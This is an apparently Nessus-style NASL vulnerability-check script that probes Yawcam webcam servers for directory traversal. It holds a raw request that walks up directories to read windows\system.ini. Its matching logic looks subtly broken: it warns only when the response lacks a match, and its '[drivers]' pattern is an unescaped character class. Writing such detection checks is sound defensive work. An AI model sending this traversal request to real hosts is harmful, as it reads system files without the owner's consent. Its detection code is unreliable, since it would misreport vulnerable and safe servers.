#
#  This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#  Ref: Donato Ferrante <fdonato at autistici.org>
#
#  This script is released under the GNU GPL v2
#

if (description)
{
 script_id(18176);
 script_bugtraq_id(13295);
 script_version ("$Revision: 1.1 $");

 script_name(english:"Yawcam directory traversal");
 desc["english"] = "
The remote host is running a version of Yawcam which is 
vulnerable to a remote directory traversal bug. An attacker
exploiting this bug would be able to gain access to potentially 
confidential material outside of the web root.

Solution: Upgrade to the latest version of this software
Risk factor : Medium";

 script_description(english:desc["english"]);
 script_summary(english:"Yawcam directory traversal");
 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses", francais:"Abus de CGI");
 script_copyright(english:"This script is Copyright (C) 2005 David Maciejak");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 8081);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:8081);
if (! get_port_state(port) ) exit(0);

data = "local.html";
data = http_get(item:data, port:port);
buf = http_keepalive_send_recv(port:port, data:data);
if( buf == NULL ) exit(0);

if (egrep(pattern:"<title>Yawcam</title>", string:buf))
{
  req = string("GET ..\..\..\..\..\..\..\..\windows\system.ini HTTP/1.0\r\n");
  soc = http_open_socket(port);
  if ( ! soc ) exit(0);
  send(socket:soc, data:req);
  res = http_recv_headers(soc);
  close (soc);
  if (! egrep(string:res, pattern:"[drivers]") )
  {
	security_warning(port);	
  }
}

exit(0);
